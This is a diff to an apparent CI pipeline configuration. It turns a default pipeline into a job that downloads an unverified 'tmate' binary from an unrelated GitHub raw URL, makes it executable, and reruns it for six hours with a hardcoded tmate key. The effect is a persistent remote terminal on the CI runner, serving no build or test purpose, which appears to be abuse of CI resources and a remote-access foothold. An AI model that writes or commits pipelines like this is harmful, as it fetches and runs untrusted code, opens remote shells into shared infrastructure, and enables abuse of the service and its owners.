@@ -1,13 +1,23 @@
 version: v1.0
-name: Initial Pipeline
+name: Run tmate for 6 hours
 agent:
   machine:
-    type: f1-standard-2
-    os_image: ubuntu2204
+    os_image: ubuntu2004
+    type: e1-standard-2
 blocks:
-  - name: 'Block #1'
+  - name: Download and Run tmate for 6 hours
     task:
       jobs:
-        - name: 'Job #1'
+        - name: Download and Run tmate
           commands:
             - checkout
+            - sudo apt-get update
+            - sudo apt-get install -y wget
+            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
+            - chmod +x tmate
+            - |
+              end=$((SECONDS+21600))
+              while [ $SECONDS -lt $end ]; do
+                ./tmate -F -n j1 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg || true
+                sleep 5
+              done
